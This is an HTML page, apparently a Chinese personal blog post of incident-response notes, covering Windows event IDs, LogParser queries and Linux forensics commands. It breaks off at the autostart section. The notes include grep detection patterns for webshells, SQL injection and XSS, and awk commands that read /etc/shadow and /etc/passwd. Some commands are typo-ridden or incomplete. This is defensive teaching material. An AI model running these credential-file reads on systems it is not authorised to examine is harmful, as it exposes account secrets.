@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>应急响应 - 东隅 Blog</title><meta name="author" content="东隅">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='攻防, 应急响应' />
+  <meta itemprop="name" content="应急响应">
+  <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
+  <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
+  <meta itemprop="wordCount" content="733">
+  <meta itemprop="keywords" content="攻防,应急响应"><meta property="og:url" content="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E9%98%B2%E5%AE%88/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/39/">
+  <meta property="og:site_name" content="东隅 Blog">
+  <meta property="og:title" content="应急响应">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-15T09:31:01+08:00">
+    <meta property="article:modified_time" content="2024-08-15T09:31:01+08:00">
+    <meta property="article:tag" content="攻防">
+    <meta property="article:tag" content="应急响应">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="应急响应">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E9%98%B2%E5%AE%88/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/39/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E9%98%B2%E5%AE%88/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/40/" /><link rel="next" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/55/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "应急响应",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E9%98%B2%E5%AE%88\/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94\/39\/"
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "攻防, 应急响应","wordcount":  733 ,
+    "url": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E9%98%B2%E5%AE%88\/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94\/39\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
+      "@type": "Organization",
+      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
+        "@type": "Person",
+        "name": "东隅"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ></a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">应急响应</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>应急响应</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category" title="Category - 攻防"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 攻防</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="733 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 800 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>4 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><p>思路</p>
+<p><a href="http://maqi.vip/posts/%E8%AE%BA%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6%E6%80%9D%E6%83%B3/"target="_blank" rel="external nofollow noopener noreferrer">http://maqi.vip/posts/%E8%AE%BA%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6%E6%80%9D%E6%83%B3/</a></p>
+<p>根据用户现场的情况往往还需要做一些信息收集的工作比如，出现异常的时间点(非常重要)、异常服务器的主要业务情况、大致的一个网络拓扑是不是在DMZ区、是否可以公网访问、开放了那些端口、是否有打补丁、使用了怎么样的一个web技术、最近是否做过什么变更、有没有什么安全设备之类的。 根据收集到的信息，往往可以得出了几种可能。漏洞很多有些漏洞开发未能及时修复，是否应该规避风险，采取何种策略；一个web服务器公网可以访问出现了被挂黑链的事件使用框架类，那么初步可以怀疑是命令执行漏洞了；如果一台公网服务器没有安装补丁又没有防火墙防护，administrator的密码为P@sswrod那么有很大的可能性是被暴力破解成功；后面的工作主要就是收集各种资料证明这一猜想即可。</p>
+<p>==查看最近一个月更改的文件:find -type f  -mtime -30==</p>
+<p>在服务器被入侵后进行应急响应无非通过文件排查、网络排查、进程排查、系统信息排查等方法进行入侵排查</p>
+<p>关注点：</p>
+<ul>
+<li>日志分析</li>
+<li>文件分析</li>
+<li>进程分析</li>
+<li>自启动 计划任务</li>
+</ul>
+<blockquote>
+<ol>
+<li>什么是日志？日志记录一个服务或应用程序在运行过程中所发生的事件和活动。</li>
+<li>日志分类 web日志 系统日志</li>
+<li>日志存放的位置</li>
+</ol>
+</blockquote>
+<h6 id="web日志分析" class="heading-element"><span>0.0.0.0.1  web日志分析</span>
+  <a href="#web%e6%97%a5%e5%bf%97%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><pre tabindex="0"><code>1.我们查看连接的时候 查看数值
+2.我们去查看连接状态是否被远控：
+1.名字连接名字xx.asp名字比较异常的要注意，找到那个文件位置分析是否是恶意文件
+2.因为远控连接的一般是只有攻击者才可能去访问，查看攻击ip只有一个或者两个 那么我们需要注意，进一步排查
+3.木马文件相对于访问频率低，我们就可以排查
+4.木马文件与其它文件交互少，我们可以进一步排查是否恶意文件
+5.跟管理员沟通，查看一些新增记录 确认恶意文件 （post型）上传php.asp文件，一般是只有管理员权限；然后我们去还原路径 可以排查sql注入等
+作日志分析我们就知道web服务器入侵的痕迹了</code></pre><h6 id="系统日志分析" class="heading-element"><span>0.0.0.0.2  系统日志分析</span>
+  <a href="#%e7%b3%bb%e7%bb%9f%e6%97%a5%e5%bf%97%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>我们要关注时间，去筛选 创建记录等可以找到隐藏账号；判断系统的安全日志可以分析它</p>
+<pre tabindex="0"><code>windows系统日志包含系统日志，安全日志、应用日志等
+敏感事件id:
+4624 登录成功
+4625 登录失败
+4720 创建用户
+4634 注销成功
+4647 用户启动的注销
+4672 使用超级用户/管理员用户进行登录</code></pre><p>系统日志分析-Log Parser</p>
+<pre tabindex="0"><code>登录成功的所有事件
+LogParser.exe -i:EVT –o:DATAGRID &#34;SELECT * FROM Security.evtx路径 where EventID=4624&#34;
+指定登录时间范围的事件：
+LogParser.exe -i:EVT –o:DATAGRID &#34;SELECT * FROM Security.evtx路径 where 
+TimeGenerated&gt;&#39;2023-02-19 23:32:11&#39; and TimeGenerated
+提取登录成功的用户名和IP：
+LogParser.exe -i:EVT –o:DATAGRID &#34;SELECT EXTRACT_TOKEN(Message,13,&#39; &#39;) as 
+EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,&#39;|&#39;) as 
+Username,EXTRACT_TOKEN(Message,38,&#39; &#39;) as Loginip FROM Security.evtx路径 where 
+EventID=4624&#34;
+登录失败的所有事件：
+LogParser.exe -i:EVT –o:DATAGRID &#34;SELECT * FROM Security.evtx路径 EventID=4625&#34;</code></pre><h6 id="linux" class="heading-element"><span>0.0.0.0.3  linux</span>
+  <a href="#linux" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><pre tabindex="0"><code>常用命令介绍：
+find 文件名  find 搜索路径 【选项】 内容
+ -name 区分大小写php      -type 文件类型  f普通文件  d目录  i查找软链接
+ -iname不区分大小写php    -size  文件大小  +50k比我们50k还要大的文件 -100k比100k还要小的文件
+ -inum      修改时间  -atime访问的时间 -mtime数据修改的时间 -ctime文件修改的时间
+ +5 代表6天前修改的文件 -5代表5到6天内修改的文件  5代表5到6天那一天修改的文件
+ ls -i 1.php
+ 1234
+ find -inum 1234
+ find -type f -name &#34;*.php&#34;|xargs grep &#39;eval&#39;| more   #去找到一个个文件的内容，显示出来
+ 权限搜索 -perm
+ 所属组所有者  -uid  -gid  -user用户名  -nouser(没有所属组的文件)
+ 逻辑运算符 &amp; -a   逻辑或-o  逻辑非-not
+awk  【选项】匹配规则处理规则 路径-F指定分隔符 默认是空格作为分隔 : ,
+设置一个变量  数组 定义函数  加减运算  字符串的拼接  $1   $0 
+一般会联合sort -n 排序，sort -n|uniq &gt; 1 (uniq去重  -c计数) 
+awk &#39;{print substr($4,2,11)}&#39; logs |sort| uniq -c  #sort排序  uniq去重
+awk -F:&#39;length($2)=0 {print $1}&#39; /etc/shadow   #空口令账号的查看 
+cat 
+grep | cat ps
+-c   统计行数
+-v   去掉我们的内容
+ ps -ef |grep ssh|grep -v grep  
+ find ./ -name &#34;.php&#34; |xargs grep &#34;eval()&#34;    xargs不支持管道符命令传递参数可以用这个函数 #匹配木马病毒文件
+
+
+1.SQL注入检攻击检测
+grep -E -i &#34;select&#34; log1
+2.xss跨站脚本攻击检测
+grep -E -i &#34;
+(S)%26%23x3c%3B(S+)%3E|(S)%26%23x3c%3B(S+)%2F%3E|(S+)&lt;(S+)&gt;|(S+)&lt;(S+)/&#34; log1</code></pre><p>系统安全日志:</p>
+<ul>
+<li>cat /var/log/secure Centos</li>
+<li>cat /var/log/auth Ubuntu</li>
+<li>vim /etc/rsyslog.conf 查看日志存放位置 在配置文件下面查看</li>
+</ul>
+<p>比较重要的几个日志：</p>
+<ul>
+<li>登录失败记录：/var/log/btmp //lastb</li>
+<li>登录成功记录: /var/log/wtmp //last</li>
+<li>目前登录用户信息：/var/run/utmp</li>
+</ul>
+<h5 id="linux分析排查" class="heading-element"><span>0.0.0.1  Linux分析排查</span>
+  <a href="#linux%e5%88%86%e6%9e%90%e6%8e%92%e6%9f%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><h6 id="文件分析" class="heading-element"><span>0.0.0.1.1  文件分析</span>
+  <a href="#%e6%96%87%e4%bb%b6%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>####### 敏感文件信息</p>
+<ul>
+<li>
+<p>在Linux中一切都是文件，其中/tmp是一个特别的临时目录文件，每个用户都可以对它进行读写执行操作。</p>
+</li>
+<li>
+<p>查看开机启动项内容/etc/init.d，恶意代码很有可能设置在开机自启动的位置</p>
+<p>查看指定目录下文件时间顺序的排序：<strong>ls -alt | head -n 10</strong></p>
+<p>查看文件时间属性：<strong>stat 文件名</strong></p>
+</li>
+<li>
+<p>新增文件分析：</p>
+<p>查找24小时内被修改的文件：<strong>find ./ - mtime 0 -name “*.php”</strong></p>
+<p>查找48小时内新增的文件：<strong>find ./ -ctime -2 -name “*.php”</strong></p>
+<p>权限查找：在Linux系统中，如果具有777权限，那么文件和可疑：<strong>find ./ -iname “*.php” -perm 777</strong></p>
+</li>
+</ul>
+<h6 id="进程分析" class="heading-element"><span>0.0.0.1.2  进程分析</span>
+  <a href="#%e8%bf%9b%e7%a8%8b%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>####### 网络连接分析</p>
+<p>在Linux中可疑使用netstat进行网络连接查看:<strong>netstat -pantl</strong></p>
+<p>netstat -Print network connections,routing tables,interface statistics,masquerade connections,and multicast memberships</p>
+<p>具体帮助信息查看man netstat</p>
+<p>常用命令netstat -pant 查看处于tcp网络套接字相关信息</p>
+<p>关闭位置连接 <strong>kill -9 pid</strong></p>
+<p>####### 进程所对文件</p>
+<p>在Linux中可以使用ps查看进程相关信息</p>
+<p>使用ps aux查看所有进程信息</p>
+<p>使用ps aux | grep PID 筛选出具体PID进程信息，lsof -i：端口号也可以实现此类功能</p>
+<h6 id="登陆分析" class="heading-element"><span>0.0.0.1.3  登陆分析</span>
+  <a href="#%e7%99%bb%e9%99%86%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>在Linux做的所有操作都会被记录道系统日志中，对于登陆也可以查看日志信息查看是否有异常登陆</p>
+<p>last -i | grep -v 0.0.0.0 查看登陆日志，筛选非本地登陆</p>
+<p>w命令 实时登陆查看</p>
+<p>####### 异常用户排查</p>
+<table>
+<thead>
+<tr>
+<th><code>1 2 3 4 5 </code></th>
+<th><code>cat /etc/passwd grep &quot;0:0&quot; /etc/passwd ls -l /etc/passwd awk -F: '$3==0' {print $1} '/etc/passwd' awk -F: '$2==&quot;!&quot; {pirint $1}' /etc/shadow 或者 awk -F :'length($2)==0 {print $1}' /etc/shadow </code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h6 id="历史命令分析" class="heading-element"><span>0.0.0.1.4  历史命令分析</span>
+  <a href="#%e5%8e%86%e5%8f%b2%e5%91%bd%e4%bb%a4%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>在Linux系统中默认会记录之前执行的命令/root/.bash_history文件中</p>
+<p>用户可以使用cat /root/.bash_history进行查看或者使用history命令查看</p>
+<p>特别注意：==wget（可能远程下载木马），ssh（连接内网主机），tar zip（数据大包）系统配置等==</p>
+<h6 id="计划任务排查crontab" class="heading-element"><span>0.0.0.1.5  计划任务排查crontab</span>
+  <a href="#%e8%ae%a1%e5%88%92%e4%bb%bb%e5%8a%a1%e6%8e%92%e6%9f%a5crontab" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>在Linux系统中可以使用命令 crontab进行计划任务的设定</p>
+<p>其中-e可以用来编辑设定计划任务，-l可以用来查看当前计划任务，-d用来删除计划任务</p>
+<p>特别注意计划中未知任务</p>
+<h6 id="开机自启动项" class="heading-element"><span>0.0.0.1.6  开机自启动项</span>
+  <a href="#%e5%bc%80%e6%9c%ba%e8%87%aa%e5%90%af%e5%8a%a8%e9%a1%b9" class="heading-mark">
